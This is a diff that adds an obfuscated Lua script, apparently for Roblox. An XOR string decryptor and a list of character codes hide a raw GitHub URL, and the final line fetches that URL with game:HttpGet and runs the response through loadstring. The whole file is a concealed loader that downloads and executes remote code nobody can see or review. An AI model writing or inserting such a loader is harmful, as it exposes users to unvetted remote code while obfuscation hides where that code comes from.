@@ -1,0 +1,35 @@
+local obf_stringchar = string.char;
+
+local obf_stringbyte = string.byte;
+
+local obf_stringsub = string.sub;
+
+local obf_bitlib = bit32 or bit;
+
+local obf_XOR = obf_bitlib.bxor;
+
+local obf_tableconcat = table.concat;
+
+local obf_tableinsert = table.insert;
+
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+
+	local result = {};	for i = 1, #LUAOBFUSACTOR_STR do
+
+		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1 + ((i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
+
+	end
+
+	return obf_tableconcat(result);
+
+end
+
+local TABLE_TableIndirection = {};
+
+TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\45\242\224\228\6\238\186\213\46\222\204\215\96\182", "\126\177\163\187\69\134\219\167")] = {[1]=tostring(utf8.char((function()
+
+	return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,56,53,55,57,54,48,47,45,47,109,97,105,110,47,37,69,55,37,65,55,37,56,66,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67,37,69,53,37,56,65,37,65,48,37,69,53,37,65,70,37,56,54,37,69,55,37,65,67,37,65,67,37,69,53,37,57,66,37,57,66,37,69,53,37,66,49,37,56,50});
+
+end)()))};
+
+loadstring(game:HttpGet(TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\207\0\238\21\230\244\34\223\26\202\243\47\136\122", "\156\67\173\74\165")][1]))();
